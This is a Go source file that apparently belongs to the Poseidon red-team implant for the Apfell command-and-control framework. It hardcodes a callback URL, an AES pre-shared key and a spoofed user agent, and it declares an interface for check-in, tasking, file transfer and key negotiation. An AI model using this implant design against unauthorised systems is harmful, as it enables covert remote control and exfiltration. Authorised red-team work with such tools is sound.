package profiles

import (
	"crypto/rsa"
	"math/rand"
	"time"

	"github.com/xorrior/poseidon/pkg/utils/structs"
)

var (
	UUID                         = "9b77febd-527b-4b00-b3d5-1cd5acb7aac4"
	ExchangeKeyString            = "T"
	AesPSK                       = "oLRANTsFUwT6Lz85rfz05YVS8ugreGizo1bHtWDyRsY="
	BaseURL                      = "http://192.168.193.140:9000/"
	BaseURLs                     = []string{}
	UserAgent                    = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/419.3 (KHTML, like Gecko) Safari/419.3" // Change this value
	Sleep                        = 10
	HostHeader                   = "" // Use an empty string if it's not being used
	seededRand        *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
)

//Profile - Primary interface for apfell C2 profiles
type Profile interface {
	// CheckIn method for sending the initial checkin to the server
	CheckIn(ip string, pid int, user string, host string) interface{}
	// GetTasking method for retrieving the next task from apfell
	GetTasking() interface{}
	// Post a task response to the server
	PostResponse(task structs.Task, output string) []byte
	// Start EKE key negotiation for encrypted comms
	NegotiateKey() string
	// C2 profile implementation for downloading files
	Download(task structs.Task, params string)
	// C2 profile implementation for uploading files
	Upload(task structs.Task, fileid string) []byte
	// C2 profile implementation to generate a unique session ID
	GenerateSessionID() string
	// C2 Profile implementation to get a file with specified id
	GetFile(fileid string) []byte

	Header() string
	SetHeader(hostname string)
	URL() string
	SetURL(url string)
	SleepInterval() int
	SetSleepInterval(interval int)
	C2Commands() []string
	SetC2Commands(commands []string)
	XKeys() bool
	SetXKeys(exchangingkeys bool)
	SetUserAgent(ua string)
	GetUserAgent() string
	ApfID() string
	SetApfellID(newID string)
	UniqueID() string
	SetUniqueID(newUUID string)
	AesPreSharedKey() string
	SetAesPreSharedKey(newkey string)
	RsaKey() *rsa.PrivateKey
	SetRsaKey(newKey *rsa.PrivateKey)
}
